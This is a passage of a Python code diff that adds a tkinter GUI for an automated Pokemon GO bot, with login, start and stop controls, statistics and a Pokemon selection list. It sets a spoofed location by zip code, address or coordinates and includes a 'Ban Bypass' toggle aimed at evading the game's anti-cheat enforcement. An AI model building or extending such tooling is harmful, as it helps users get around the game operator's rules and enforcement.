+                  command=self.stop_pokemon_bot).pack(fill=tk.X, pady=2)
+        ttk.Button(control_frame, text="⏸️ Pause Bot", 
+                  command=self.pause_pokemon_bot).pack(fill=tk.X, pady=2)
+        ttk.Button(control_frame, text="📊 Refresh Stats", 
+                  command=self.refresh_pokemon_stats).pack(fill=tk.X, pady=2)
+        
+        # Bot settings
+        settings_frame = ttk.LabelFrame(left_panel, text="⚙️ Bot Settings", padding=5)
+        settings_frame.pack(fill=tk.BOTH, expand=True)
+        
+        # Walk speed
+        ttk.Label(settings_frame, text="Walk Speed (km/h):").pack(anchor='w')
+        self.walk_speed = tk.StringVar(value="4.16")
+        ttk.Entry(settings_frame, textvariable=self.walk_speed, width=30).pack(fill=tk.X, pady=(0, 5))
+        
+        # Catch Pokemon
+        self.catch_pokemon = tk.BooleanVar(value=True)
+        ttk.Checkbutton(settings_frame, text="Catch Pokemon", variable=self.catch_pokemon).pack(anchor='w')
+        
+        # Spin Pokestops
+        self.spin_pokestops = tk.BooleanVar(value=True)
+        ttk.Checkbutton(settings_frame, text="Spin Pokestops", variable=self.spin_pokestops).pack(anchor='w')
+        
+        # Battle Gyms
+        self.battle_gyms = tk.BooleanVar(value=False)
+        ttk.Checkbutton(settings_frame, text="Battle Gyms", variable=self.battle_gyms).pack(anchor='w')
+        
+        # Transfer Pokemon
+        self.transfer_pokemon = tk.BooleanVar(value=True)
+        ttk.Checkbutton(settings_frame, text="Transfer Low CP Pokemon", variable=self.transfer_pokemon).pack(anchor='w')
+        
+        # Pokemon Selection Button
+        ttk.Button(settings_frame, text="🎯 Select Pokemon to Catch", 
+                  command=self.open_pokemon_selection).pack(fill=tk.X, pady=(10, 5))
+        
+        # AI Settings
+        ai_frame = ttk.LabelFrame(settings_frame, text="🤖 AI Settings", padding=5)
+        ai_frame.pack(fill=tk.X, pady=(5, 0))
+        
+        # Ban Bypass
+        self.ban_bypass = tk.BooleanVar(value=True)
+        ttk.Checkbutton(ai_frame, text="🛡️ Ban Bypass", variable=self.ban_bypass).pack(anchor='w')
+        
+        # Smart Catching
+        self.smart_catching = tk.BooleanVar(value=True)
+        ttk.Checkbutton(ai_frame, text="🎯 Smart Catching", variable=self.smart_catching).pack(anchor='w')
+        
+        # Auto Evolve
+        self.auto_evolve = tk.BooleanVar(value=True)
+        ttk.Checkbutton(ai_frame, text="🔄 Auto Evolve", variable=self.auto_evolve).pack(anchor='w')
+        
+        # Auto Powerup
+        self.auto_powerup = tk.BooleanVar(value=True)
+        ttk.Checkbutton(ai_frame, text="⚡ Auto Powerup", variable=self.auto_powerup).pack(anchor='w')
+        
+        # Mega Evolve
+        self.mega_evolve = tk.BooleanVar(value=True)
+        ttk.Checkbutton(ai_frame, text="🌟 Mega Evolve", variable=self.mega_evolve).pack(anchor='w')
+        
+        # Min CP Threshold
+        ttk.Label(ai_frame, text="Min CP Threshold:").pack(anchor='w')
+        self.min_cp_threshold = tk.StringVar(value="100")
+        ttk.Entry(ai_frame, textvariable=self.min_cp_threshold, width=20).pack(anchor='w')
+        
+        # Geolocation Settings
+        geo_frame = ttk.LabelFrame(left_panel, text="🌍 Geolocation Settings", padding=5)
+        geo_frame.pack(fill=tk.X, pady=(5, 0))
+        
+        # Location input methods
+        location_input_frame = ttk.Frame(geo_frame)
+        location_input_frame.pack(fill=tk.X, pady=(0, 5))
+        
+        # Zip Code input
+        ttk.Label(location_input_frame, text="Zip Code:").pack(side=tk.LEFT, padx=(0, 5))
+        self.zip_code = tk.StringVar(value="10036")
+        ttk.Entry(location_input_frame, textvariable=self.zip_code, width=10).pack(side=tk.LEFT, padx=(0, 5))
+        ttk.Button(location_input_frame, text="📍 Set by Zip", 
+                  command=self.set_location_by_zip).pack(side=tk.LEFT, padx=(0, 5))
+        
+        # Address input
+        ttk.Label(location_input_frame, text="Address:").pack(side=tk.LEFT, padx=(10, 5))
+        self.address = tk.StringVar(value="Times Square, New York, NY")
+        ttk.Entry(location_input_frame, textvariable=self.address, width=20).pack(side=tk.LEFT, padx=(0, 5))
+        ttk.Button(location_input_frame, text="📍 Set by Address", 
+                  command=self.set_location_by_address).pack(side=tk.LEFT, padx=(0, 5))
+        
+        # Coordinates input
+        coords_frame = ttk.Frame(geo_frame)
+        coords_frame.pack(fill=tk.X, pady=(5, 0))
+        
+        ttk.Label(coords_frame, text="Lat:").pack(side=tk.LEFT, padx=(0, 5))
+        self.latitude = tk.StringVar(value="40.7589")
+        ttk.Entry(coords_frame, textvariable=self.latitude, width=10).pack(side=tk.LEFT, padx=(0, 5))
+        
+        ttk.Label(coords_frame, text="Lng:").pack(side=tk.LEFT, padx=(5, 5))
+        self.longitude = tk.StringVar(value="-73.9851")
+        ttk.Entry(coords_frame, textvariable=self.longitude, width=10).pack(side=tk.LEFT, padx=(0, 5))
+        
+        ttk.Button(coords_frame, text="📍 Set by Coordinates", 
+                  command=self.set_location_by_coordinates).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Location info display
+        self.location_info = tk.Text(geo_frame, height=6, width=50)
+        self.location_info.pack(fill=tk.X, pady=(5, 0))
+        
+        # Location control buttons
+        location_buttons_frame = ttk.Frame(geo_frame)
+        location_buttons_frame.pack(fill=tk.X, pady=(5, 0))
+        
+        ttk.Button(location_buttons_frame, text="🗺️ View Map", 
+                  command=self.view_location_map).pack(side=tk.LEFT, padx=(0, 5))
+        ttk.Button(location_buttons_frame, text="🔥 Find Hotspots", 
+                  command=self.find_pokemon_hotspots).pack(side=tk.LEFT, padx=(0, 5))
+        ttk.Button(location_buttons_frame, text="📍 Get Location Info", 
+                  command=self.get_location_info).pack(side=tk.LEFT, padx=(0, 5))
+        
+        # Right panel - Map and Stats
+        right_panel = ttk.LabelFrame(main_container, text="🗺️ Map & Statistics", padding=10)
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
+        
+        # Map display
+        map_frame = ttk.LabelFrame(right_panel, text="🗺️ Current Location", padding=5)
+        map_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        self.pokemon_map_display = tk.Canvas(map_frame, bg='lightblue', height=200)
+        self.pokemon_map_display.pack(fill=tk.BOTH, expand=True)
+        
+        # Draw a simple map
+        self.pokemon_map_display.create_rectangle(50, 50, 300, 150, fill='green', outline='black')
+        self.pokemon_map_display.create_oval(140, 90, 160, 110, fill='red', outline='black')
+        self.pokemon_map_display.create_text(150, 130, text="Current Position", font=('Arial', 10))
+        
+        # Statistics
+        stats_frame = ttk.LabelFrame(right_panel, text="📈 Live Statistics", padding=5)
+        stats_frame.pack(fill=tk.X)
+        
+        self.pokemon_stats_text = scrolledtext.ScrolledText(stats_frame, height=6)
+        self.pokemon_stats_text.pack(fill=tk.X)
+        
+        # Initialize stats
+        self.update_pokemon_stats_display()
+        
+        # Log section
+        log_frame = ttk.LabelFrame(pokemon_frame, text="📋 Bot Log", padding=5)
+        log_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        self.pokemon_bot_log = scrolledtext.ScrolledText(log_frame, height=6)
+        self.pokemon_bot_log.pack(fill=tk.X)
+        
+        # Add initial log entries
+        self.pokemon_bot_log.insert(tk.END, "⚡ Pokemon GO Bot initialized\n")
+        self.pokemon_bot_log.insert(tk.END, "🔧 Enter credentials and click 'Login & Connect'\n")
+        self.pokemon_bot_log.insert(tk.END, "📍 Set your location coordinates\n")
+    
+    def login_pokemon_bot(self):
+        """Login to Pokemon GO with real authentication"""
+        try:
+            username = self.pokemon_username.get().strip()
+            password = self.pokemon_password.get().strip()
+            login_method = self.login_method.get()
+            
+            if not username or not password:
+                messagebox.showerror("Error", "Please enter username and password")
+                return
+            
+            self.pokemon_bot_log.insert(tk.END, f"🔐 Attempting {login_method.upper()} login...\n")
+            self.pokemon_bot_log.insert(tk.END, f"👤 Username: {username}\n")
+            
+            # Initialize Pokemon bot
+            try:
+                from Thunderbolt_PokemonGO_Bot import ThunderboltPokemonGOBot
+                self.pokemon_bot = ThunderboltPokemonGOBot(gui_callback=self.pokemon_bot_callback)
+                
+                # Set credentials
+                self.pokemon_bot.set_credentials(username, password, login_method)
+                
+                # Set API settings
+                self.pokemon_bot.config['api_password'] = self.api_password.get()
+                self.pokemon_bot.config['api_url'] = self.api_url.get()
+                self.pokemon_bot.config['bot_name'] = self.bot_name.get()
+                
+                # Set location
+                lat = float(self.pokemon_lat.get())
+                lng = float(self.pokemon_lng.get())
+                alt = float(self.pokemon_alt.get())
+                self.pokemon_bot.set_location(lat, lng, alt)
+                
+                # Attempt login
+                if self.pokemon_bot.login():
+                    self.pokemon_bot_status.config(text="Status: Connected", foreground="green")
+                    self.pokemon_bot_log.insert(tk.END, "✅ Login successful!\n")
+                    
+                    # Get player info
+                    player_info = self.pokemon_bot.get_player_info()
+                    if player_info:
+                        self.pokemon_bot_level.config(text=f"Trainer Level: {player_info.get('level', 'Unknown')}")
+                        self.pokemon_bot_xp.config(text=f"XP: {player_info.get('experience', 'Unknown'):,}")
+                        self.pokemon_bot_stardust.config(text=f"Stardust: {player_info.get('stardust', 'Unknown'):,}")
+                    
+                    messagebox.showinfo("Login Success", "Successfully connected to Pokemon GO!")
+                else:
+                    self.pokemon_bot_status.config(text="Status: Login Failed", foreground="red")
+                    self.pokemon_bot_log.insert(tk.END, "❌ Login failed!\n")
+                    messagebox.showerror("Login Failed", "Failed to connect to Pokemon GO. Check credentials.")
+                    
+            except ImportError as e:
+                self.pokemon_bot_log.insert(tk.END, f"❌ Error importing Pokemon bot: {e}\n")
+                messagebox.showerror("Error", "Pokemon bot module not available")
+            except Exception as e:
+                self.pokemon_bot_log.insert(tk.END, f"❌ Login error: {e}\n")
+                messagebox.showerror("Error", f"Login failed: {e}")
+                
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Unexpected error: {e}\n")
+            messagebox.showerror("Error", f"Unexpected error: {e}")
+    
+    def open_ptc_login(self):
+        """Open official Pokemon Trainer Club login page"""
+        try:
+            import webbrowser
+            webbrowser.open("https://access.pokemon.com/login")
+            self.pokemon_bot_log.insert(tk.END, "🔗 Opening Pokemon Trainer Club login page...\n")
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Failed to open PTC login: {e}\n")
+    
+    def show_ptc_help(self):
+        """Show PTC login help"""
+        help_text = """
+🔐 Pokemon Trainer Club Login Help
+
+1. Click "Open PTC Login" to go to the official login page
+2. Create an account at https://access.pokemon.com/login if you don't have one
+3. Use your PTC username and password in the bot
+4. Make sure your account is verified and active
+
+📝 Username Requirements:
+• 3-15 characters
+• Letters, numbers, underscores, and hyphens only
+• Must be unique
+
+🔒 Password Requirements:
+• At least 6 characters
+• Mix of letters and numbers recommended
+
+⚠️ Important:
+• Use the same credentials you use for Pokemon GO
+• Make sure your account is not banned
+• Keep your credentials secure
+        """
+        messagebox.showinfo("PTC Login Help", help_text)
+    
+    def validate_credentials(self, event=None):
+        """Validate PTC credentials in real-time"""
+        try:
+            username = self.pokemon_username.get()
+            password = self.pokemon_password.get()
+            
+            if username and password:
+                # Basic validation
+                if len(username) < 3:
+                    self.credential_status.config(text="❌ Username must be at least 3 characters", foreground="red")
+                elif len(password) < 6:
+                    self.credential_status.config(text="❌ Password must be at least 6 characters", foreground="red")
+                elif not username.replace('_', '').replace('-', '').isalnum():
+                    self.credential_status.config(text="❌ Username can only contain letters, numbers, underscores, and hyphens", foreground="red")
+                else:
+                    self.credential_status.config(text="✅ Credentials format is valid", foreground="green")
+            else:
+                self.credential_status.config(text="", foreground="green")
+                
+        except Exception as e:
+            self.credential_status.config(text=f"❌ Validation error: {e}", foreground="red")
+    
+    def auto_login_pokemon(self):
+        """Automatically login with pre-filled credentials"""
+        try:
+            self.pokemon_bot_log.insert(tk.END, "🚀 Starting automatic login...\n")
+            self.pokemon_bot_log.insert(tk.END, f"👤 Username: {self.pokemon_username.get()}\n")
+            self.pokemon_bot_log.insert(tk.END, "🔐 Password: [HIDDEN]\n")
+            
+            # Validate credentials first
+            if not self.pokemon_username.get() or not self.pokemon_password.get():
+                self.pokemon_bot_log.insert(tk.END, "❌ Username or password is empty!\n")
+                return
+            
+            # Call the regular login method
+            self.login_pokemon_bot()
+            
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Auto-login error: {e}\n")
+            messagebox.showerror("Auto-Login Error", f"Failed to auto-login: {e}")
+    
+    def test_api_connection(self):
+        """Test PokemonGoBot API connection"""
+        try:
+            from PokemonGoBot_API import PokemonGoBotAPI
+            
+            api_client = PokemonGoBotAPI(
+                base_url=self.api_url.get(),
+                bot_name=self.bot_name.get(),
+                password=self.api_password.get(),
+                gui_callback=self.pokemon_bot_callback
+            )
+            
+            if api_client.test_connection():
+                self.pokemon_bot_log.insert(tk.END, "✅ API connection successful!\n")
+                messagebox.showinfo("API Test", "Successfully connected to PokemonGoBot API!")
+            else:
+                self.pokemon_bot_log.insert(tk.END, "❌ API connection failed!\n")
+                messagebox.showerror("API Test", "Failed to connect to PokemonGoBot API. Make sure the bot is running with REST API enabled.")
+                
+        except ImportError:
+            self.pokemon_bot_log.insert(tk.END, "❌ PokemonGoBot API client not available\n")
+            messagebox.showerror("API Test", "PokemonGoBot API client not available")
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ API test error: {e}\n")
+            messagebox.showerror("API Test", f"API test error: {e}")
+    
+    def start_pokemon_bot(self):
+        """Start the Pokemon GO bot automation"""
+        if not self.pokemon_bot:
+            messagebox.showerror("Error", "Please login first!")
+            return
+        
+        if self.pokemon_bot_running:
+            messagebox.showwarning("Warning", "Bot is already running!")
+            return
+        
+        try:
+            # Configure bot settings
+            self.pokemon_bot.set_walk_speed(float(self.walk_speed.get()))
+            self.pokemon_bot.set_catch_pokemon(self.catch_pokemon.get())
+            self.pokemon_bot.set_spin_pokestops(self.spin_pokestops.get())
+            self.pokemon_bot.set_battle_gyms(self.battle_gyms.get())
+            self.pokemon_bot.set_transfer_pokemon(self.transfer_pokemon.get())
+            
+            # Update AI settings
+            self.pokemon_bot.config['ban_bypass'] = self.ban_bypass.get()
+            self.pokemon_bot.config['smart_catching'] = self.smart_catching.get()
+            self.pokemon_bot.config['auto_evolve'] = self.auto_evolve.get()
+            self.pokemon_bot.config['auto_powerup'] = self.auto_powerup.get()
+            self.pokemon_bot.config['mega_evolve'] = self.mega_evolve.get()
+            self.pokemon_bot.config['min_cp_threshold'] = int(self.min_cp_threshold.get())
+            
+            # Start bot in separate thread
+            self.pokemon_bot_running = True
+            self.pokemon_bot_thread = threading.Thread(target=self.run_pokemon_bot, daemon=True)
+            self.pokemon_bot_thread.start()
+            
+            self.pokemon_bot_status.config(text="Status: Running", foreground="green")
+            self.pokemon_bot_log.insert(tk.END, "🚀 Pokemon GO Bot started!\n")
+            self.pokemon_bot_log.insert(tk.END, "🎯 Beginning automation...\n")
+            messagebox.showinfo("Pokemon Bot", "Pokemon GO Bot started successfully!")
+            
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Error starting bot: {e}\n")
+            messagebox.showerror("Error", f"Failed to start bot: {e}")
+    
+    def stop_pokemon_bot(self):
+        """Stop the Pokemon GO bot"""
+        if not self.pokemon_bot_running:
+            messagebox.showwarning("Warning", "Bot is not running!")
+            return
+        
+        try:
+            self.pokemon_bot_running = False
+            if self.pokemon_bot:
+                self.pokemon_bot.stop()
+            
+            self.pokemon_bot_status.config(text="Status: Stopped", foreground="red")
+            self.pokemon_bot_log.insert(tk.END, "⏹️ Pokemon GO Bot stopped\n")
+            messagebox.showinfo("Pokemon Bot", "Pokemon GO Bot stopped!")
+            
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Error stopping bot: {e}\n")
+            messagebox.showerror("Error", f"Failed to stop bot: {e}")
+    
+    def pause_pokemon_bot(self):
+        """Pause/Resume the Pokemon GO bot"""
+        if not self.pokemon_bot:
+            messagebox.showerror("Error", "Please login first!")
+            return
+        
+        try:
+            if self.pokemon_bot.is_paused():
+                self.pokemon_bot.resume()
+                self.pokemon_bot_status.config(text="Status: Running", foreground="green")
+                self.pokemon_bot_log.insert(tk.END, "▶️ Bot resumed\n")
+                messagebox.showinfo("Pokemon Bot", "Bot resumed!")
+            else:
+                self.pokemon_bot.pause()
+                self.pokemon_bot_status.config(text="Status: Paused", foreground="orange")
+                self.pokemon_bot_log.insert(tk.END, "⏸️ Bot paused\n")
+                messagebox.showinfo("Pokemon Bot", "Bot paused!")
+                
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Error pausing bot: {e}\n")
+            messagebox.showerror("Error", f"Failed to pause bot: {e}")
+    
+    def refresh_pokemon_stats(self):
+        """Refresh Pokemon GO statistics"""
+        if not self.pokemon_bot:
+            messagebox.showerror("Error", "Please login first!")
+            return
+        
+        try:
+            # Get live stats from bot
+            live_stats = self.pokemon_bot.get_live_stats()
+            if live_stats:
+                # Update main status labels
+                self.pokemon_bot_level.config(text=f"Trainer Level: {live_stats.get('level', 'Unknown')}")
+                self.pokemon_bot_xp.config(text=f"XP: {live_stats.get('experience', 'Unknown'):,}")
+                self.pokemon_bot_stardust.config(text=f"Stardust: {live_stats.get('stardust', 'Unknown'):,}")
+                
+                # Update status
+                status_text = f"Status: {live_stats.get('bot_status', 'Unknown')} | Mode: {live_stats.get('mode', 'Unknown')}"
+                self.pokemon_bot_status.config(text=status_text)
+                
+                # Update detailed stats
+                self.update_pokemon_stats_display()
+                
+                self.pokemon_bot_log.insert(tk.END, f"📊 Stats refreshed - Level {live_stats.get('level', 'Unknown')}, XP: {live_stats.get('experience', 'Unknown'):,}\n")
+            else:
+                # Fallback to basic player info
+                player_info = self.pokemon_bot.get_player_info()
+                if player_info:
+                    self.pokemon_bot_level.config(text=f"Trainer Level: {player_info.get('level', 'Unknown')}")
+                    self.pokemon_bot_xp.config(text=f"XP: {player_info.get('experience', 'Unknown'):,}")
+                    self.pokemon_bot_stardust.config(text=f"Stardust: {player_info.get('stardust', 'Unknown'):,}")
+                
+                self.pokemon_bot_log.insert(tk.END, "📊 Statistics refreshed (basic mode)\n")
+            
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Error refreshing stats: {e}\n")
+            messagebox.showerror("Error", f"Failed to refresh stats: {e}")
+    
+    def run_pokemon_bot(self):
+        """Run the Pokemon bot in background thread"""
+        try:
+            while self.pokemon_bot_running and self.pokemon_bot:
+                # Run bot step
+                self.pokemon_bot.step()
+                
+                # Update stats periodically with real data
+                if hasattr(self, 'pokemon_bot') and self.pokemon_bot:
+                    self.update_pokemon_stats_display()
+                
+                # Auto-refresh stats every 10 seconds
+                if hasattr(self, 'last_stats_refresh'):
+                    if time.time() - self.last_stats_refresh > 10:
+                        self.root.after(0, self.refresh_pokemon_stats)
+                        self.last_stats_refresh = time.time()
+                else:
+                    self.last_stats_refresh = time.time()
+                
+                # Small delay to prevent overwhelming
+                time.sleep(1)
+                
+        except Exception as e:
+            self.pokemon_bot_log.insert(tk.END, f"❌ Bot error: {e}\n")
+            self.pokemon_bot_running = False
+            self.pokemon_bot_status.config(text="Status: Error", foreground="red")
+    
+    def pokemon_bot_callback(self, message):
+        """Callback for Pokemon bot messages"""
+        try:
+            self.pokemon_bot_log.insert(tk.END, f"{message}\n")
+            self.pokemon_bot_log.see(tk.END)
+        except:
+            pass
+    
+    def update_pokemon_stats_display(self):
+        """Update the Pokemon stats display"""
+        try:
+            if not self.pokemon_bot:
+                stats_content = """🎮 Pokemon GO Bot Statistics:
+• Status: Not Connected
+• Please login to see live statistics
+• Set your location coordinates
+• Configure bot settings"""
+            else:
+                # Get real stats from bot
+                stats = self.pokemon_bot.get_statistics()
+                
+                stats_content = f"""🎮 Pokemon GO Bot Statistics:
+• Pokemon Caught: {stats.get('pokemon_caught', 0):,}
+• XP Gained: {stats.get('xp_gained', 0):,}
+• Stardust: {stats.get('stardust', 0):,}
+• Pokestops Visited: {stats.get('pokestops_visited', 0):,}
+• Gyms Battled: {stats.get('gyms_battled', 0):,}
+• Eggs Hatched: {stats.get('eggs_hatched', 0):,}
+• Distance Walked: {stats.get('distance_walked', 0):.2f} km
+• Current Streak: {stats.get('current_streak', 0)} days"""
+            
+            # Update stats display
+            self.pokemon_stats_text.config(state=tk.NORMAL)
+            self.pokemon_stats_text.delete(1.0, tk.END)
+            self.pokemon_stats_text.insert(tk.END, stats_content)
+            self.pokemon_stats_text.config(state=tk.DISABLED)
+            
+        except Exception as e:
+            print(f"Error updating stats: {e}")
+    
+    def view_pokemon_stats(self):
+        """View detailed Pokemon GO statistics"""
+        if not self.pokemon_bot:
+            messagebox.showerror("Error", "Please login first!")
+            return
+        
+        try:
+            stats_window = tk.Toplevel(self.root)
+            stats_window.title("Pokemon GO Statistics")
+            stats_window.geometry("500x400")
+            
+            stats_text = scrolledtext.ScrolledText(stats_window, height=20)
+            stats_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+            
+            # Get detailed stats from bot
+            detailed_stats = self.pokemon_bot.get_detailed_statistics()
+            
+            stats_text.insert(tk.END, detailed_stats)
+            stats_text.config(state=tk.DISABLED)
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to get detailed stats: {e}")
+    
+    def open_pokemon_selection(self):
+        """Open Pokemon selection window"""
+        try:
+            # Create Pokemon selection window
+            pokemon_window = tk.Toplevel(self.root)
+            pokemon_window.title("🎯 Select Pokemon to Catch")
+            pokemon_window.geometry("800x600")
+            pokemon_window.resizable(True, True)
+            
+            # Initialize selected Pokemon list
+            if not hasattr(self, 'selected_pokemon'):
+                self.selected_pokemon = set()
+            
+            # Main container
+            main_frame = ttk.Frame(pokemon_window)
+            main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+            
+            # Title
+            title_label = ttk.Label(main_frame, text="🎯 Select Pokemon to Catch", 
+                                   font=('Arial', 16, 'bold'))
+            title_label.pack(pady=(0, 10))
+            
+            # Search frame
+            search_frame = ttk.Frame(main_frame)
+            search_frame.pack(fill=tk.X, pady=(0, 10))
+            
+            ttk.Label(search_frame, text="Search Pokemon:").pack(side=tk.LEFT, padx=(0, 10))
+            search_var = tk.StringVar()
+            search_entry = ttk.Entry(search_frame, textvariable=search_var, width=30)
+            search_entry.pack(side=tk.LEFT, padx=(0, 10))
+            search_entry.bind('<KeyRelease>', lambda e: self.filter_pokemon_list(search_var.get(), pokemon_listbox))
+            
+            # Select all/none buttons
+            ttk.Button(search_frame, text="Select All", 
+                      command=lambda: self.select_all_pokemon(pokemon_listbox)).pack(side=tk.LEFT, padx=5)
+            ttk.Button(search_frame, text="Select None", 
+                      command=lambda: self.select_none_pokemon(pokemon_listbox)).pack(side=tk.LEFT, padx=5)
+            
+            # Pokemon list frame
+            list_frame = ttk.Frame(main_frame)
+            list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+            
+            # Create scrollable listbox
+            pokemon_listbox = tk.Listbox(list_frame, selectmode=tk.MULTIPLE, height=20)
+            scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=pokemon_listbox.yview)
+            pokemon_listbox.configure(yscrollcommand=scrollbar.set)
+            
+            pokemon_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+            
+            # Load all Pokemon
+            self.load_all_pokemon(pokemon_listbox)
+            
+            # Selected Pokemon count
+            count_label = ttk.Label(main_frame, text="Selected: 0 Pokemon")
+            count_label.pack(pady=(0, 10))
+            
+            # Update count when selection changes
+            def update_count():
+                selected_count = len(pokemon_listbox.curselection())
+                count_label.config(text=f"Selected: {selected_count} Pokemon")
+                pokemon_window.after(100, update_count)
+            
+            update_count()
+            
+            # Button frame
+            button_frame = ttk.Frame(main_frame)
+            button_frame.pack(fill=tk.X)
+            
+            ttk.Button(button_frame, text="✅ Save Selection", 
+                      command=lambda: self.save_pokemon_selection(pokemon_listbox, pokemon_window)).pack(side=tk.RIGHT, padx=(5, 0))
+            ttk.Button(button_frame, text="❌ Cancel", 
+                      command=pokemon_window.destroy).pack(side=tk.RIGHT)
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to open Pokemon selection: {e}")
+    
+    def load_all_pokemon(self, listbox):
+        """Load all Pokemon into the listbox"""
+        try:
+            # Complete list of all Pokemon (Gen 1-9)
+            all_pokemon = [
+                # Generation 1 (Kanto)
+                "001 - Bulbasaur", "002 - Ivysaur", "003 - Venusaur", "004 - Charmander", "005 - Charmeleon",
+                "006 - Charizard", "007 - Squirtle", "008 - Wartortle", "009 - Blastoise", "010 - Caterpie",
+                "011 - Metapod", "012 - Butterfree", "013 - Weedle", "014 - Kakuna", "015 - Beedrill",
+                "016 - Pidgey", "017 - Pidgeotto", "018 - Pidgeot", "019 - Rattata", "020 - Raticate",
+                "021 - Spearow", "022 - Fearow", "023 - Ekans", "024 - Arbok", "025 - Pikachu",
+                "026 - Raichu", "027 - Sandshrew", "028 - Sandslash", "029 - Nidoran♀", "030 - Nidorina",
+                "031 - Nidoqueen", "032 - Nidoran♂", "033 - Nidorino", "034 - Nidoking", "035 - Clefairy",
+                "036 - Clefable", "037 - Vulpix", "038 - Ninetales", "039 - Jigglypuff", "040 - Wigglytuff",
+                "041 - Zubat", "042 - Golbat", "043 - Oddish", "044 - Gloom", "045 - Vileplume",
+                "046 - Paras", "047 - Parasect", "048 - Venonat", "049 - Venomoth", "050 - Diglett",
+                "051 - Dugtrio", "052 - Meowth", "053 - Persian", "054 - Psyduck", "055 - Golduck",
+                "056 - Mankey", "057 - Primeape", "058 - Growlithe", "059 - Arcanine", "060 - Poliwag",
+                "061 - Poliwhirl", "062 - Poliwrath", "063 - Abra", "064 - Kadabra", "065 - Alakazam",
+                "066 - Machop", "067 - Machoke", "068 - Machamp", "069 - Bellsprout", "070 - Weepinbell",
+                "071 - Victreebel", "072 - Tentacool", "073 - Tentacruel", "074 - Geodude", "075 - Graveler",
+                "076 - Golem", "077 - Ponyta", "078 - Rapidash", "079 - Slowpoke", "080 - Slowbro",
+                "081 - Magnemite", "082 - Magneton", "083 - Farfetch'd", "084 - Doduo", "085 - Dodrio",
+                "086 - Seel", "087 - Dewgong", "088 - Grimer", "089 - Muk", "090 - Shellder",
+                "091 - Cloyster", "092 - Gastly", "093 - Haunter", "094 - Gengar", "095 - Onix",
+                "096 - Drowzee", "097 - Hypno", "098 - Krabby", "099 - Kingler", "100 - Voltorb",
+                "101 - Electrode", "102 - Exeggcute", "103 - Exeggutor", "104 - Cubone", "105 - Marowak",
+                "106 - Hitmonlee", "107 - Hitmonchan", "108 - Lickitung", "109 - Koffing", "110 - Weezing",
+                "111 - Rhyhorn", "112 - Rhydon", "113 - Chansey", "114 - Tangela", "115 - Kangaskhan",
+                "116 - Horsea", "117 - Seadra", "118 - Goldeen", "119 - Seaking", "120 - Staryu",
+                "121 - Starmie", "122 - Mr. Mime", "123 - Scyther", "124 - Jynx", "125 - Electabuzz",
+                "126 - Magmar", "127 - Pinsir", "128 - Tauros", "129 - Magikarp", "130 - Gyarados",
+                "131 - Lapras", "132 - Ditto", "133 - Eevee", "134 - Vaporeon", "135 - Jolteon",
+                "136 - Flareon", "137 - Porygon", "138 - Omanyte", "139 - Omastar", "140 - Kabuto",
+                "141 - Kabutops", "142 - Aerodactyl", "143 - Snorlax", "144 - Articuno", "145 - Zapdos",
+                "146 - Moltres", "147 - Dratini", "148 - Dragonair", "149 - Dragonite", "150 - Mewtwo",
+                "151 - Mew",
+                
+                # Generation 2 (Johto)
+                "152 - Chikorita", "153 - Bayleef", "154 - Meganium", "155 - Cyndaquil", "156 - Quilava",
+                "157 - Typhlosion", "158 - Totodile", "159 - Croconaw", "160 - Feraligatr", "161 - Sentret",
+                "162 - Furret", "163 - Hoothoot", "164 - Noctowl", "165 - Ledyba", "166 - Ledian",
+                "167 - Spinarak", "168 - Ariados", "169 - Crobat", "170 - Chinchou", "171 - Lanturn",
+                "172 - Pichu", "173 - Cleffa", "174 - Igglybuff", "175 - Togepi", "176 - Togetic",
+                "177 - Natu", "178 - Xatu", "179 - Mareep", "180 - Flaaffy", "181 - Ampharos",
+                "182 - Bellossom", "183 - Marill", "184 - Azumarill", "185 - Sudowoodo", "186 - Politoed",
+                "187 - Hoppip", "188 - Skiploom", "189 - Jumpluff", "190 - Aipom", "191 - Sunkern",
+                "192 - Sunflora", "193 - Yanma", "194 - Wooper", "195 - Quagsire", "196 - Espeon",
+                "197 - Umbreon", "198 - Murkrow", "199 - Slowking", "200 - Misdreavus", "201 - Unown",
+                "202 - Wobbuffet", "203 - Girafarig", "204 - Pineco", "205 - Forretress", "206 - Dunsparce",
+                "207 - Gligar", "208 - Steelix", "209 - Snubbull", "210 - Granbull", "211 - Qwilfish",
+                "212 - Scizor", "213 - Shuckle", "214 - Heracross", "215 - Sneasel", "216 - Teddiursa",
+                "217 - Ursaring", "218 - Slugma", "219 - Magcargo", "220 - Swinub", "221 - Piloswine",
+                "222 - Corsola", "223 - Remoraid", "224 - Octillery", "225 - Delibird", "226 - Mantine",
+                "227 - Skarmory", "228 - Houndour", "229 - Houndoom", "230 - Kingdra", "231 - Phanpy",
+                "232 - Donphan", "233 - Porygon2", "234 - Stantler", "235 - Smeargle", "236 - Tyrogue",
+                "237 - Hitmontop", "238 - Smoochum", "239 - Elekid", "240 - Magby", "241 - Miltank",
+                "242 - Blissey", "243 - Raikou", "244 - Entei", "245 - Suicune", "246 - Larvitar",
+                "247 - Pupitar", "248 - Tyranitar", "249 - Lugia", "250 - Ho-Oh", "251 - Celebi",
+                
+                # Generation 3 (Hoenn)
+                "252 - Treecko", "253 - Grovyle", "254 - Sceptile", "255 - Torchic", "256 - Combusken",
